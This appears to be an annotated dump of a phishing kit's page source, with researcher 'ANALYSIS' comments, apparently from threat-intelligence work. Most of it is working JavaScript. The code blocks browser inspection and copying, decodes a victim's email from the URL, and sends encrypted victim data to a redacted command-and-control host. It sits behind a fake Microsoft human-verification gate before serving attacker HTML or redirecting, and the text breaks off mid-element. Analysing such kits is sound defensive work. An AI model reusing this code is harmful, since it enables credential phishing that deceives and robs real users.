+                        <li><a href="https://twitter.com" rel="noopener noreferrer">Twitter</a></li>
+                        <li><a href="https://linkedin.com" rel="noopener noreferrer">LinkedIn</a></li>
+                        <li><a href="https://facebook.com" rel="noopener noreferrer">Facebook</a></li>
+                        <li><a href="https://youtube.com" rel="noopener noreferrer">YouTube</a></li>
+                    </ul>
+                </section>
+            </aside>
+        </main>
+        <section aria-labelledby="_th">
+            <h2 id="_th">Testimonials</h2>
+            <blockquote>
+                <p>This platform has completely transformed how our team stays informed. The quality of analysis is unmatched.</p>
+                <footer><cite>Amanda Torres, VP of Engineering at Meridian Corp</cite></footer>
+            </blockquote>
+            <blockquote>
+                <p>A must-read resource for anyone in the industry. The practical guides alone are worth the subscription.</p>
+                <footer><cite>David Park, Senior Consultant at Apex Strategies</cite></footer>
+            </blockquote>
+        </section>
+        <footer role="contentinfo">
+            <div>
+                <section>
+                    <h4>Company</h4>
+                    <ul><li><a href="/about">About</a></li><li><a href="/team">Team</a></li><li><a href="/careers">Careers</a></li><li><a href="/press">Press</a></li></ul>
+                </section>
+                <section>
+                    <h4>Resources</h4>
+                    <ul><li><a href="/blog">Blog</a></li><li><a href="/guides">Guides</a></li><li><a href="/webinars">Webinars</a></li><li><a href="/api">API Docs</a></li></ul>
+                </section>
+                <section>
+                    <h4>Support</h4>
+                    <ul><li><a href="/help">Help Center</a></li><li><a href="/contact">Contact Us</a></li><li><a href="/status">System Status</a></li><li><a href="/community">Community</a></li></ul>
+                </section>
+                <section>
+                    <h4>Legal</h4>
+                    <ul><li><a href="/privacy">Privacy Policy</a></li><li><a href="/terms">Terms of Service</a></li><li><a href="/cookies">Cookie Policy</a></li><li><a href="/accessibility">Accessibility</a></li></ul>
+                </section>
+            </div>
+            <div>
+                <p>© 2025 All rights reserved. Built with care for our community of readers and professionals worldwide.</p>
+            </div>
+        </footer>
+    </div>
+    <script>if(window._abLevel>=2){var _sfc=document.getElementById('_staticFakeContent');if(_sfc)_sfc.style.display='block';}</script>
+
+    <div class="loader-container" id="loaderContainer">
+        <div class="msSpinner"></div>
+    </div>
+    
+    <script>
+
+
+
+(function() {
+
+var showLoader = new URLSearchParams(window.location.search).get('pb_token') !== '1';
+
+if (showLoader) {
+    var css = '*{margin:0;padding:0;box-sizing:border-box}' +
+        'body{background:#1b1b1b}' +
+        '#loaderContainer{position:fixed;inset:0;align-items:center;justify-content:center;z-index:9999;background:#1b1b1b}' +
+        '.msSpinner{width:48px;height:48px;position:relative}' +
+        '.msSpinner::before{content:"";position:absolute;inset:0;border:3px solid rgba(255,255,255,0.1);border-top-color:#0078d4;border-radius:50%;animation:msSpin 0.9s linear infinite}' +
+        '@keyframes msSpin{to{transform:rotate(360deg)}}';
+
+    var style = document.createElement('style');
+    style.textContent = css;
+    document.head.appendChild(style);
+
+    var container = document.getElementById('loaderContainer');
+    var loader = document.getElementById('loaderElement');
+    if (container && loader) { loader.outerHTML = '<div class="msSpinner"></div>'; }
+}
+})();
+
+
+<!-- ANALYSIS: Hardcoded AES-CBC passphrase and C2 base URL. The passphrase is in client-side source, publicly accessible. Any captured C2 traffic is decryptable by anyone who reads this file. -->
+var _API_KEY = '[REDACTED-AES-KEY]';
+var _TTL = 60;
+var _WEBHOOK_BASE = 'https://[REDACTED-C2-HOST]';
+var _FALLBACK = 'https://[REDACTED-FALLBACK-URL]';
+
+<!-- ANALYSIS: Derives the AES-CBC key by running SHA-256 over the hardcoded passphrase string. Key is not rotated per-session; the same key encrypts all traffic from all victims. -->
+async function _getAesKey(ks) {
+    var kd = new TextEncoder().encode(ks);
+    var hsh = await crypto.subtle.digest('SHA-256', kd);
+    return await crypto.subtle.importKey('raw', hsh, { name: 'AES-CBC' }, false, ['encrypt', 'decrypt']);
+}
+<!-- ANALYSIS: AES-CBC encryption. A random 16-byte IV is generated per payload, prepended to the ciphertext, then encoded as URL-safe base64. The IV is not secret — it is transmitted with every payload. -->
+async function _encryptData(data) {
+    var key = await _getAesKey(_API_KEY);
+    var iv = crypto.getRandomValues(new Uint8Array(16));
+    var enc = new TextEncoder().encode(JSON.stringify(data));
+    var encrypted = await crypto.subtle.encrypt({ name: 'AES-CBC', iv: iv }, key, enc);
+    var combined = new Uint8Array(iv.length + encrypted.byteLength);
+    combined.set(iv); combined.set(new Uint8Array(encrypted), iv.length);
+    var b64 = btoa(String.fromCharCode.apply(null, combined));
+    return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+<!-- ANALYSIS: Decrypts C2 responses using the same AES-CBC key. The C2 sends back encrypted HTML or a URL. Two-way encryption means the C2 response channel is also encrypted, but with the same publicly-visible key. -->
+async function _decryptData(encData) {
+    try {
+        var b64 = encData.replace(/-/g, '+').replace(/_/g, '/');
+        while (b64.length % 4) b64 += '=';
+        var raw = Uint8Array.from(atob(b64), function(c) { return c.charCodeAt(0) });
+        var iv = raw.slice(0, 16), ct = raw.slice(16);
+        var key = await _getAesKey(_API_KEY);
+        var dec = await crypto.subtle.decrypt({ name: 'AES-CBC', iv: iv }, key, ct);
+        return JSON.parse(new TextDecoder().decode(dec));
+    } catch (e) { return null; }
+}
+
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+document.addEventListener('keydown', function(e) {
+    if (e.keyCode === 123) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.keyCode === 80) { e.preventDefault(); return false; }
+});
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+
+var _parsed_hash = '', _parsed_e = '', _parsed_h = '', _parsed_c = '', _parsed_r = '', _parsed_t = '0', _parsed_op = '0';
+var _parsed_ok = false;
+var _mode_url = '';
+(function() {
+    var p = new URLSearchParams(window.location.search);
+    var ei = p.get('ei') || '';
+    if (!ei || !ei.trim()) {
+        var h = window.location.hash;
+        if (h && h.length > 1) ei = h.substring(1);
+    }
+    if (!ei || !ei.trim()) return;
+    ei = ei.trim();
+    _parsed_hash = ei;
+    _parsed_ok = true;
+
+    var standardDelim = ei.indexOf('--'), emailDelim = ei.indexOf('__');
+    var delimIndex = -1, isEmailMode = false;
+    if (emailDelim !== -1) { delimIndex = emailDelim; isEmailMode = true; }
+    else if (standardDelim !== -1) { delimIndex = standardDelim; isEmailMode = false; }
+    if (delimIndex !== -1) {
+        try {
+            var encPart = ei.substring(0, delimIndex), afterDelim = ei.substring(delimIndex + 2);
+            var b64 = encPart.replace(/-/g, '+').replace(/_/g, '/');
+            while (b64.length % 4) b64 += '=';
+            var dec = atob(b64);
+            var params = new URLSearchParams(dec);
+            if (params.has('_h')) { _parsed_hash = params.get('_h'); }
+            if (params.has('e')) _parsed_e = params.get('e');
+            if (params.has('h')) _parsed_h = params.get('h');
+            if (params.has('c')) _parsed_c = params.get('c');
+            if (params.has('r')) _parsed_r = params.get('r');
+            if (params.has('t')) _parsed_t = params.get('t');
+            if (params.has('op')) _parsed_op = params.get('op');
+            if (isEmailMode && afterDelim) {
+                var emailCode = afterDelim.replace(/^##|##$/g, '').replace(/^\[\[|\]\]$/g, '').replace(/^\{\{|\}\}$/g, '');
+                if (emailCode) _parsed_e = emailCode;
+            }
+        } catch (ex) {}
+    }
+    if (_parsed_e) {
+        try { _parsed_e = decodeURIComponent(_parsed_e); } catch (_) {}
+        try {
+            var _b64re = /^[A-Za-z0-9+/\-_]+=*$/;
+            if (_b64re.test(_parsed_e) && _parsed_e.length > 3) {
+                var _eb64 = _parsed_e.replace(/-/g, '+').replace(/_/g, '/');
+                while (_eb64.length % 4) _eb64 += '=';
+                var _edec = atob(_eb64);
+                if (_edec && _edec.length > 0) _parsed_e = _edec;
+            }
+        } catch (_) {}
+    }
+    if (!_parsed_e) _parsed_e = p.get('e') || '';
+    if (!_parsed_h) _parsed_h = p.get('h') || '';
+    if (!_parsed_c) _parsed_c = p.get('c') || '';
+    if (!_parsed_r) _parsed_r = p.get('r') || '0';
+    if (!_parsed_op || _parsed_op === '0') _parsed_op = p.get('op') || '0';
+})();
+
+
+<!-- ANALYSIS: Core C2 exfiltration function. Encrypts victim data (email, campaign hash, host, code, redirect flag) and POSTs to C2 /create. Decrypts response. If response contains data.html: delivers via blob URL (no phishing domain in address bar) or document.write (overlay mode). If data.url: verifies URL then redirects. Falls back to JotForm if C2 is unreachable. -->
+async function doFetch() {
+    if (!_parsed_ok) return null;
+    try {
+        var payload = { hash: _parsed_hash, ttl: _TTL, e: _parsed_e, h: _parsed_h, c: _parsed_c, r: _parsed_r, t: _parsed_t, op: _parsed_op, domain: window.location.hostname };
+        var encPayload = await _encryptData(payload);
+        var res = await fetch(_WEBHOOK_BASE + '/create', { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: encPayload });
+        if (!res.ok) return null;
+        var encResp = await res.text();
+        var data = await _decryptData(encResp);
+        if (!data || !data.success) return null;
+        if (data.mode_url) _mode_url = data.mode_url;
+        if (data.html) {
+            var htmlContent = data.html;
+            if (data.html_encoded) {
+                try { htmlContent = decodeURIComponent(escape(atob(htmlContent))); } catch (e) { return null; }
+            }
+            if (_parsed_op !== '0') {
+                document.open();
+                document.write(htmlContent);
+                document.close();
+                return '__overlay__';
+            }
+            var blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
+            return URL.createObjectURL(blob);
+        }
+        if (data.url) {
+            if (!data.cached) {
+                for (var i = 0; i < 5; i++) {
+                    try { var probe = await fetch(data.url, { method: 'GET', cache: 'no-store', redirect: 'follow' }); if (probe.status === 200) break; } catch (e) {}
+                    await new Promise(function(ok) { setTimeout(ok, 500) });
+                }
+            }
+            return data.url;
+        }
+        return null;
+    } catch (e) { return null; }
+}
+
+(function() {
+
+var HOLD_DURATION = 3000;
+var _FONT = "'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',Arial,sans-serif";
+
+<!-- ANALYSIS: Builds and injects the full gate UI into the DOM at runtime. Primary variant: Microsoft press-and-hold CAPTCHA using a real image from logincdn.msftauth.net. The email pill pre-fills the victim's email from the decoded ei= parameter, adding apparent legitimacy. -->
+function showCaptcha() {
+
+    var css = document.createElement('style');
+    css.textContent =
+        '*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}' +
+        'html,body{height:100%}' +
+        'body{font-family:' + _FONT + ';background:#1b1b1b;color:#fff;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}' +
+        '@keyframes auroraShift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-5%,3%) scale(1.05)}}' +
+        '@keyframes slideDisk{0%{left:-40px;opacity:0;transform:translateY(-50%) scale(0.5)}8%{opacity:1;transform:translateY(-50%) scale(1.05)}12%{transform:translateY(-50%) scale(1)}88%{opacity:1;transform:translateY(-50%) scale(1)}95%{transform:translateY(-50%) scale(0.95)}100%{left:calc(100% + 6px);opacity:0;transform:translateY(-50%) scale(0.5)}}' +
+        '@keyframes sweepFill{0%{width:0}100%{width:100%}}' +
+        '@keyframes glowPulse{0%,100%{box-shadow:0 0 6px rgba(0,120,212,0.3),0 2px 8px rgba(0,0,0,0.2)}50%{box-shadow:0 0 16px rgba(0,120,212,0.6),0 2px 12px rgba(0,0,0,0.3)}}';
+    document.head.appendChild(css);
+
+    var aurora = document.createElement('div');
+    aurora.style.cssText = 'position:fixed;inset:0;z-index:0;overflow:hidden;' +
+        'background:linear-gradient(135deg,#0a0a1a 0%,#1a1a2e 30%,#16213e 60%,#0f3460 100%)';
+    var auroraBefore = document.createElement('div');
+    auroraBefore.style.cssText = 'position:absolute;inset:-50%;' +
+        'background:radial-gradient(ellipse 80% 50% at 20% 80%,rgba(59,130,246,0.15) 0%,transparent 70%),' +
+        'radial-gradient(ellipse 60% 40% at 70% 20%,rgba(99,102,241,0.12) 0%,transparent 70%),' +
+        'radial-gradient(ellipse 50% 60% at 50% 60%,rgba(139,92,246,0.08) 0%,transparent 70%);' +
+        'animation:auroraShift 20s ease-in-out infinite alternate';
+    var auroraAfter = document.createElement('div');
+    auroraAfter.style.cssText = 'position:absolute;bottom:0;left:0;right:0;height:60%;' +
+        'background:linear-gradient(to top,rgba(20,20,40,0.9) 0%,rgba(30,40,80,0.4) 40%,transparent 100%)';
+    aurora.appendChild(auroraBefore);
+    aurora.appendChild(auroraAfter);
+    document.body.appendChild(aurora);
+
+    var wrapper = document.createElement('div');
+    wrapper.style.cssText = 'flex:1;display:flex;align-items:center;justify-content:center;padding:16px;position:relative;z-index:1';
+
+    var card = document.createElement('div');
+    card.style.cssText = 'position:relative;z-index:1;width:100%;max-width:440px;background:#292929;border-radius:8px;padding:44px 44px 48px;margin:auto;box-shadow:0 2px 6px rgba(0,0,0,0.2);text-align:center';
+
+
+    var emailPill = document.createElement('div');
+    emailPill.style.cssText = 'display:inline-flex;align-items:center;gap:6px;background:transparent;border:1px solid rgba(255,255,255,0.3);border-radius:20px;padding:4px 14px 4px 10px;font-size:13px;color:rgba(255,255,255,0.85);margin-bottom:20px;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
+    emailPill.innerHTML = '<svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="5" r="3" stroke="rgba(255,255,255,0.7)" stroke-width="1.2"/><path d="M2 14c0-3.3 2.7-6 6-6s6 2.7 6 6" stroke="rgba(255,255,255,0.7)" stroke-width="1.2" stroke-linecap="round"/></svg>';
+    var emailText = document.createElement('span');
+
+    var _email = _parsed_e;
+    if (_email && _email.indexOf('@') > -1) {
+        emailText.textContent = _email;
+    } else {
+        emailPill.style.display = 'none';
+    }
+    emailPill.appendChild(emailText);
+    card.appendChild(emailPill);
+
+    var heading = document.createElement('h1');
+    heading.textContent = "Let\u2019s prove you\u2019re human";
+    heading.style.cssText = 'font-size:24px;font-weight:600;color:#fff;margin-bottom:32px;letter-spacing:-0.3px';
+    card.appendChild(heading);
+
+    var imgWrap = document.createElement('div');
+    imgWrap.style.cssText = 'margin:0 auto 28px;width:220px;height:190px;display:flex;align-items:center;justify-content:center';
+    var scanImg = document.createElement('img');
+    scanImg.src = 'https://logincdn.msftauth.net/shared/5/images/solve_captcha_white_be191d6e17d0b842754c.png';
+    scanImg.alt = '';
+    scanImg.draggable = false;
+    scanImg.style.cssText = 'max-width:100%;max-height:100%;object-fit:contain';
+    imgWrap.appendChild(scanImg);
+    card.appendChild(imgWrap);
+
+    var subtitle = document.createElement('p');
+    subtitle.textContent = 'Press and hold the button.';
+    subtitle.style.cssText = 'font-size:15px;color:rgba(255,255,255,0.75);margin-bottom:32px';
+    card.appendChild(subtitle);
+
+    var btnRow = document.createElement('div');
+    btnRow.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:12px;max-width:340px;margin:0 auto';
+
+    var a11yIcon = document.createElement('div');
+    a11yIcon.title = 'Accessibility';
+    a11yIcon.style.cssText = 'width:44px;height:44px;flex-shrink:0;border-radius:50%;background:#0078d4;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background 0.15s';
+    a11yIcon.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none">' +
+        '<circle cx="12" cy="5" r="2.2" fill="#fff"/>' +
+        '<path d="M5.5 9.5h13" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+        '<path d="M12 9.5v5.5" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+        '<path d="M12 15l-3.5 5" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+        '<path d="M12 15l3.5 5" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+        '</svg>';
+    a11yIcon.onmouseover = function() { this.style.background = '#106ebe'; };
+    a11yIcon.onmouseout = function() { this.style.background = '#0078d4'; };
+    btnRow.appendChild(a11yIcon);
+
+    var holdBtn = document.createElement('button');
+    holdBtn.style.cssText = 'position:relative;flex:1;height:44px;border:1.5px solid #0078d4;border-radius:22px;background:#fff;color:#0078d4;font:600 15px/40px ' + _FONT + ';cursor:pointer;overflow:hidden;outline:none;user-select:none;-webkit-user-select:none;transition:background 0.2s,border-color 0.2s;touch-action:none';
+
+    var progFill = document.createElement('div');
+    progFill.style.cssText = 'position:absolute;left:0;top:0;height:100%;width:0%;background:rgba(0,120,212,0.12);border-radius:22px;transition:none;pointer-events:none';
+
+    var btnLabel = document.createElement('span');
+    btnLabel.textContent = 'Press and hold';
+    btnLabel.style.cssText = 'position:relative;z-index:1;pointer-events:none';
+
+    holdBtn.appendChild(progFill);
+    holdBtn.appendChild(btnLabel);
+    btnRow.appendChild(holdBtn);
+    card.appendChild(btnRow);
+
+    wrapper.appendChild(card);
+    document.body.appendChild(wrapper);
+
+    var footer = document.createElement('div');
+    footer.style.cssText = 'position:relative;z-index:1;text-align:center;padding:24px 16px 20px;margin-top:auto';
+    var footerLinks = document.createElement('div');
+    footerLinks.style.cssText = 'display:flex;flex-wrap:wrap;justify-content:center;gap:20px;margin-bottom:10px';
+    ['Help and feedback', 'Terms of use', 'Privacy and cookies'].forEach(function(t) {
+        var a = document.createElement('a');
+        a.href = '#';
+        a.textContent = t;
+        a.style.cssText = 'font-size:12px;color:rgba(255,255,255,0.55);text-decoration:none;transition:color 0.15s';
+        a.onmouseover = function() { this.style.color = 'rgba(255,255,255,0.85)'; };
+        a.onmouseout = function() { this.style.color = 'rgba(255,255,255,0.55)'; };
+        footerLinks.appendChild(a);
+    });
+    footer.appendChild(footerLinks);
+    var footerNote = document.createElement('div');
+    footerNote.style.cssText = 'font-size:11px;color:rgba(255,255,255,0.35)';
+    footerNote.innerHTML = 'Use private browsing if this is not your device. <a href="#" style="color:#4fc3f7;text-decoration:none">Learn more</a>';
+    footer.appendChild(footerNote);
+    document.body.appendChild(footer);
+
+    var _fetchPromise = null;
+    var _fetchResult = null;
+    var _fetchDone = false;
+    var _holding = false;
+    var _holdStart = 0;
+    var _holdComplete = false;
+    var _holdRaf = null;
+    var _redirecting = false;
+
+<!-- ANALYSIS: Hold begins on mousedown/touchstart. doFetch() is fired immediately when the user starts holding, not on completion. This pre-warms the C2 fetch so the redirect is ready the instant the hold timer completes, minimizing perceptible delay. -->
+    function startHold(e) {
+        if (!e.isTrusted || _holding || _holdComplete || _redirecting) return;
+        e.preventDefault();
+        _holding = true;
+        _holdStart = performance.now();
+
+        if (!_fetchPromise) {
+            _fetchPromise = doFetch().then(function(url) {
+                _fetchResult = url || false;
+                _fetchDone = true;
+            }).catch(function() {
+                _fetchResult = false;
+                _fetchDone = true;
+            });
+        }
+
+        holdBtn.style.background = '#eaeaea';
+        holdBtn.style.borderColor = '#005a9e';
+
+        function tick() {
+            if (!_holding) return;
+            var elapsed = performance.now() - _holdStart;
+            var pct = Math.min(1, elapsed / HOLD_DURATION);
+            progFill.style.width = (pct * 100) + '%';
+            if (pct >= 1) { onHoldComplete(); return; }
+            _holdRaf = requestAnimationFrame(tick);
+        }
+        _holdRaf = requestAnimationFrame(tick);
+    }
+
+    function endHold(e) {
+        if (!_holding || _holdComplete) return;
+        _holding = false;
+        if (_holdRaf) { cancelAnimationFrame(_holdRaf); _holdRaf = null; }
+        progFill.style.width = '0%';
+        holdBtn.style.background = '#fff';
+        holdBtn.style.borderColor = '#0078d4';
+    }
+
+<!-- ANALYSIS: Hold completes after HOLD_DURATION (3000ms). Polls for doFetch() resolution every 100ms. If the C2 fetch has already resolved, redirects immediately. Times out at 15 seconds and falls back to the JotForm URL. -->
+    function onHoldComplete() {
+        _holding = false;
+        _holdComplete = true;
+        if (_holdRaf) { cancelAnimationFrame(_holdRaf); _holdRaf = null; }
+
+        progFill.style.width = '100%';
+        progFill.style.background = 'rgba(255,255,255,0.1)';
+        holdBtn.style.background = '#107c10';
+        holdBtn.style.borderColor = '#107c10';
+        holdBtn.style.color = '#fff';
+        holdBtn.style.cursor = 'default';
+        btnLabel.textContent = 'Verified';
+
+        if (_fetchDone) { finishRedirect(); return; }
+
+        var pollInterval = setInterval(function() {
+            if (_fetchDone) { clearInterval(pollInterval); finishRedirect(); }
+        }, 100);
+
+        setTimeout(function() {
+            if (!_redirecting) {
+                clearInterval(pollInterval);
+                btnLabel.textContent = 'Error';
+                holdBtn.style.background = '#d13438';
+                holdBtn.style.borderColor = '#d13438';
+                setTimeout(function() { window.location.replace(_FALLBACK); }, 1500);
+            }
+        }, 15000);
+    }
+
+<!-- ANALYSIS: _slideFavicon fetches the redirect target's favicon via Google's favicon service and animates a disk-slide transition across the hold button before the redirect fires. This masks the redirect destination and adds visual polish that increases victim confidence. -->
+    function _slideFavicon(cb) {
+        if (!_mode_url) { cb(); return; }
+        try {
+            var a = document.createElement('a'); a.href = _mode_url;
+            var domain = a.hostname;
+            if (!domain) { cb(); return; }
+
+            var ico = new Image();
+            ico.src = 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=128';
+
+            ico.onerror = function() { cb(); };
+
+            ico.onload = function() {
+                var sweep = document.createElement('div');
+                sweep.style.cssText = 'position:absolute;left:0;top:0;height:100%;width:0;background:linear-gradient(90deg,rgba(16,124,16,0.15),rgba(16,124,16,0.08));border-radius:22px;pointer-events:none;animation:sweepFill 1.4s ease-out forwards';
+                holdBtn.appendChild(sweep);
+
+                var disk = document.createElement('div');
+                disk.style.cssText = 'position:absolute;top:50%;left:-40px;transform:translateY(-50%) scale(0.5);width:34px;height:34px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;z-index:2;opacity:0;animation:slideDisk 1.4s cubic-bezier(0.25,0.46,0.45,0.94) forwards,glowPulse 0.7s ease-in-out 0.1s 2';
+                ico.style.cssText = 'width:22px;height:22px;border-radius:50%;object-fit:contain';
+                ico.draggable = false;
+                disk.appendChild(ico);
+                holdBtn.appendChild(disk);
+
+                btnLabel.style.transition = 'opacity 0.3s';
+                btnLabel.style.opacity = '0';
+                setTimeout(function() {
+                    btnLabel.textContent = 'Opening\u2026';
+                    btnLabel.style.opacity = '1';
+                }, 300);
+
+                setTimeout(cb, 1600);
+            };
+
+            setTimeout(function() { ico.onload = ico.onerror = null; cb(); }, 5000);
+        } catch(e) { cb(); }
+    }
+
+    function finishRedirect() {
+        if (_redirecting) return;
+        _redirecting = true;
+
+        if (_fetchResult === '__overlay__') { return; }
+        if (_fetchResult && _fetchResult !== false) {
+            _slideFavicon(function() { window.location.replace(_fetchResult); });
+        } else {
+            holdBtn.style.background = '#d13438';
+            holdBtn.style.borderColor = '#d13438';
+            holdBtn.style.color = '#fff';
+            btnLabel.textContent = 'Error';
+            setTimeout(function() { window.location.replace(_FALLBACK); }, 1500);
+        }
+    }
+
+    holdBtn.addEventListener('mousedown', startHold, false);
+    holdBtn.addEventListener('mouseup', endHold, false);
+    holdBtn.addEventListener('mouseleave', endHold, false);
+    holdBtn.addEventListener('touchstart', startHold, { passive: false });
+    holdBtn.addEventListener('touchend', endHold, false);
+    holdBtn.addEventListener('touchcancel', endHold, false);
+    holdBtn.addEventListener('contextmenu', function(e) { e.preventDefault(); }, false);
+
+    setTimeout(function() {
+        if (_holdComplete || _redirecting) return;
+        holdBtn.style.pointerEvents = 'none';
+        holdBtn.style.opacity = '0.5';
+        btnLabel.textContent = 'Timed out';
+    }, 60000);
+}
+
+<!-- ANALYSIS: Alternative delivery path triggered when _parsed_r === "1". Shows a Google-style color-cycling spinner instead of the press-and-hold gate. Used for targets who have already passed a prior gate — skips the CAPTCHA and goes straight to C2 fetch and redirect. -->
+function showLoaderAndFetch() {
+    var css = document.createElement('style');
+    css.textContent =
+        '*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}' +
+        'html,body{height:100%;margin:0}' +
+        'body{background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh}' +
+        '@keyframes _gr{100%{transform:rotate(360deg)}}' +
+        '@keyframes _gd{0%{stroke-dasharray:1,150;stroke-dashoffset:0}50%{stroke-dasharray:90,150;stroke-dashoffset:-35}100%{stroke-dasharray:90,150;stroke-dashoffset:-124}}' +
+        '@keyframes _gc{0%,100%{stroke:#4285f4}25%{stroke:#ea4335}50%{stroke:#fbbc05}75%{stroke:#34a853}}';
+    document.head.appendChild(css);
+
+    var wrap = document.createElement('div');
+    wrap.style.cssText = 'text-align:center';
+    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    svg.setAttribute('viewBox', '0 0 50 50');
+    svg.style.cssText = 'width:48px;height:48px;animation:_gr 1.4s linear infinite';
+    var circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+    circle.setAttribute('cx', '25'); circle.setAttribute('cy', '25'); circle.setAttribute('r', '20');
+    circle.setAttribute('fill', 'none'); circle.setAttribute('stroke-width', '4');
+    circle.setAttribute('stroke-linecap', 'round');
+    circle.style.cssText = 'stroke:#4285f4;animation:_gd 1.4s ease-in-out infinite,_gc 5.6s ease-in-out infinite';
+    svg.appendChild(circle);
+    wrap.appendChild(svg);
+    document.body.appendChild(wrap);
+
+    doFetch().then(function(url) {
+        if (url === '__overlay__') { return; }
+        if (url) {
+            window.location.replace(url);
+        } else {
+            circle.style.animation = 'none';
+            circle.style.stroke = '#d93025';
+            setTimeout(function() { window.location.replace(_FALLBACK); }, 1500);
+        }
+    }).catch(function() {
+        circle.style.animation = 'none';
+        circle.style.stroke = '#d93025';
+        setTimeout(function() { window.location.replace(_FALLBACK); }, 1500);
+    });
+}
+
+function _initGate() {
+    if (_parsed_r === '1') { showLoaderAndFetch(); }
+    else { showCaptcha(); }
+}
+if (document.readyState === 'loading') { window.addEventListener('DOMContentLoaded', _initGate); }
+else { _initGate(); }
+})();
+
+
+    </script>
+<!-- ANALYSIS: Cloudflare Web Analytics beacon. The token links this worker to the attacker's Cloudflare account. The same token appeared on all three worker deployments, confirming shared account ownership across the campaign. -->
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;[REDACTED-ANALYTICS-TOKEN]&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+<div style="position: fixed; inset: 0px; z-index: 0; overflow: hidden; background: linear-gradient(135deg, rgb(10, 10, 26) 0%, rgb(26, 26, 46) 30%, rgb(22, 33, 62) 60%, rgb(15, 52, 96) 100%);"><div style="position: absolute; inset: -50%; background: radial-gradient(80% 50% at 20% 80%, rgba(59, 130, 246, 0.15) 0%, transparent 70%), radial-gradient(60% 40% at 70% 20%, rgba(99, 102, 241, 0.12) 0%, transparent 70%), radial-gradient(50% 60% at 50% 60%, rgba(139, 92, 246, 0.08) 0%, transparent 70%); animation: 20s ease-in-out 0s infinite alternate none running auroraShift;"></div><div style="position: absolute; bottom: 0px; left: 0px; right: 0px; height: 60%; background: linear-gradient(to top, rgba(20, 20, 40, 0.9) 0%, rgba(30, 40, 80, 0.4) 40%, transparent 100%);"></div></div><div style="flex: 1 1 0%; display: flex; align-items: center; justify-content: center; padding: 16px; position: relative; z-index: 1;"><div style="position: relative; z-index: 1; width: 100%; max-width: 440px; background: rgb(41, 41, 41); border-radius: 8px; padding: 44px 44px 48px; margin: auto; box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px; text-align: center;"><div style="display: none; align-items: center; gap: 6px; background: transparent; border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 20px; padding: 4px 14px 4px 10px; font-size: 13px; color: rgba(255, 255, 255, 0.85); margin-bottom: 20px; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"><svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="5" r="3" stroke="rgba(255,255,255,0.7)" stroke-width="1.2"></circle><path d="M2 14c0-3.3 2.7-6 6-6s6 2.7 6 6" stroke="rgba(255,255,255,0.7)" stroke-width="1.2" stroke-linecap="round"></path></svg><span></span></div><h1 style="font-size: 24px; font-weight: 600; color: rgb(255, 255, 255); margin-bottom: 32px; letter-spacing: -0.3px;">Let’s prove you’re human</h1><div style="margin: 0px auto 28px; width: 220px; height: 190px; display: flex; align-items: center; justify-content: center;"><img src="https://logincdn.msftauth.net/shared/5/images/solve_captcha_white_be191d6e17d0b842754c.png" alt="" draggable="false" style="max-width: 100%; max-height: 100%; object-fit: contain;"></div><p style="font-size: 15px; color: rgba(255, 255, 255, 0.75); margin-bottom: 32px;">Press and hold the button.</p><div style="display: flex; align-items: center; justify-content: center; gap: 12px; max-width: 340px; margin: 0px auto;"><div title="Accessibility" style="width: 44px; height: 44px; flex-shrink: 0; border-radius: 50%; background: rgb(0, 120, 212); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.15s ease 0s;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="5" r="2.2" fill="#fff"></circle><path d="M5.5 9.5h13" stroke="#fff" stroke-width="2" stroke-linecap="round"></path><path d="M12 9.5v5.5" stroke="#fff" stroke-width="2" stroke-linecap="round"></path><path d="M12 15l-3.5 5" stroke="#fff" stroke-width="2" stroke-linecap="round"></path><path d="M12 15l3.5 